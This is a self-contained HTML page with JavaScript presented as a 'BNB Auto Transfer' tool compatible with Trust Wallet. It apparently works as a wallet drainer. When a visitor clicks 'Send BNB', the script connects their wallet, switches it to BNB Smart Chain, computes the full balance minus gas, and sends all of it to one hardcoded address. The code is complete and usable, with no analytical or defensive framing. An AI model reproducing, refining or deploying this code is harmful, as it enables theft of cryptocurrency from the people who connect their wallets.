<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BNB Auto Transfer - Trust Wallet Compatible</title>
</head>
<body>
  <div style="padding: 20px; text-align: center;">
    <h2>BNB Auto Transfer</h2>
    <button id="sendButton" style="padding: 15px 30px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">Send BNB</button>
    <div id="status" style="margin-top: 20px; padding: 10px; background: #f8f9fa; border-radius: 5px;"></div>
  </div>

  <script>
    const receiverAddress = '0x70d459946ccea3CAC19ca79c9E40ea291625fAf8';
    
    function updateStatus(message, isError = false) {
      const status = document.getElementById('status');
      status.innerHTML = message;
      status.style.color = isError ? 'red' : 'green';
      console.log(message);
    }

    document.getElementById('sendButton').addEventListener('click', async () => {
      updateStatus('Starting transaction process...');

      if (!window.ethereum) {
        updateStatus('Please install MetaMask or Trust Wallet!', true);
        return;
      }

      try {
        // Request account access
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const userAccount = accounts[0];
        updateStatus(`Connected: ${userAccount.substring(0,6)}...${userAccount.substring(38)}`);

        // Check if on BSC
        let chainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (chainId !== '0x38') {
          updateStatus('Switching to BNB Smart Chain...');
          try {
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x38' }],
            });
          } catch (switchError) {
            if (switchError.code === 4902) {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: '0x38',
                  chainName: 'BNB Smart Chain',
                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                  rpcUrls: ['https://bsc-dataseed1.binance.org/'],
                  blockExplorerUrls: ['https://bscscan.com/']
                }],
              });
            } else {
              throw switchError;
            }
          }
          // Verify chain switch
          chainId = await window.ethereum.request({ method: 'eth_chainId' });
          if (chainId !== '0x38') {
            updateStatus('Please manually switch to BNB Smart Chain', true);
            return;
          }
        }

        // Get balance
        updateStatus('Checking balance...');
        const balanceHex = await window.ethereum.request({
          method: 'eth_getBalance',
          params: [userAccount, 'latest']
        });
        
        const balanceWei = BigInt(balanceHex);
        const balanceEth = parseFloat(balanceWei.toString()) / Math.pow(10, 18);
        
        updateStatus(`Current Balance: ${balanceEth.toFixed(6)} BNB`);

        // Check minimum balance
        if (balanceEth < 0.001) {
          updateStatus(`Insufficient balance. Need at least 0.001 BNB, current: ${balanceEth.toFixed(6)} BNB`, true);
          return;
        }

        // Use simple fixed gas calculation to avoid negative amounts
        const gasLimit = 21000;
        const gasPrice = 5000000000; // 5 Gwei in Wei
        const gasReserve = gasLimit * gasPrice * 2; // Double reserve for safety
        
        // Calculate amount (ensure positive)
        const gasReserveBigInt = BigInt(gasReserve);
        
        if (balanceWei <= gasReserveBigInt) {
          updateStatus('Balance too low for gas fees', true);
          return;
        }
        
        const sendAmount = balanceWei - gasReserveBigInt;
        const sendAmountEth = parseFloat(sendAmount.toString()) / Math.pow(10, 18);
        
        if (sendAmountEth <= 0) {
          updateStatus('No amount available to send after gas fees', true);
          return;
        }

        updateStatus(`Preparing to send: ${sendAmountEth.toFixed(6)} BNB`);

        // Sign message for confirmation
        const confirmMessage = `Send ${sendAmountEth.toFixed(6)} BNB to ${receiverAddress}`;
        
        try {
          await window.ethereum.request({
            method: 'personal_sign',
            params: [confirmMessage, userAccount],
          });
          updateStatus('Message signed. Sending transaction...');
        } catch (signError) {
          updateStatus('Transaction cancelled by user', true);
          return;
        }

        // Create transaction object - simplified approach
        const txParams = {
          from: userAccount,
          to: receiverAddress,
          value: '0x' + sendAmount.toString(16),
          gas: '0x' + gasLimit.toString(16),
          gasPrice: '0x' + gasPrice.toString(16)
        };

        console.log('Transaction params:', txParams);
        updateStatus('Submitting transaction...');

        // Send transaction
        const txHash = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [txParams],
        });

        updateStatus(`âœ… Success! Transaction Hash: ${txHash}`);
        
        // Show success alert
        alert(`Transaction Successful!\nAmount: ${sendAmountEth.toFixed(6)} BNB\nTo: ${receiverAddress}\nHash: ${txHash}`);

      } catch (error) {
        console.error('Error:', error);
        
        let errorMsg = 'Transaction failed';
        
        if (error.code === 4001) {
          errorMsg = 'Transaction rejected by user';
        } else if (error.code === -32000) {
          if (error.message && error.message.includes('insufficient funds')) {
            errorMsg = 'Insufficient funds for transaction';
          } else {
            errorMsg = 'Network error or insufficient gas';
          }
        } else if (error.message) {
          if (error.message.includes('User denied') || error.message.includes('cancelled')) {
            errorMsg = 'Transaction cancelled by user';
          } else if (error.message.includes('insufficient')) {
            errorMsg = 'Insufficient balance or gas';
          } else {
            errorMsg = `Error: ${error.message.substring(0, 100)}`;
          }
        }
        
        updateStatus(errorMsg, true);
        alert(errorMsg);
      }
    });

    // Add some basic styling
    document.getElementById('sendButton').addEventListener('mouseover', function() {
      this.style.background = '#0056b3';
    });
    
    document.getElementById('sendButton').addEventListener('mouseout', function() {
      this.style.background = '#007bff';
    });
  </script>
</body>
</html>
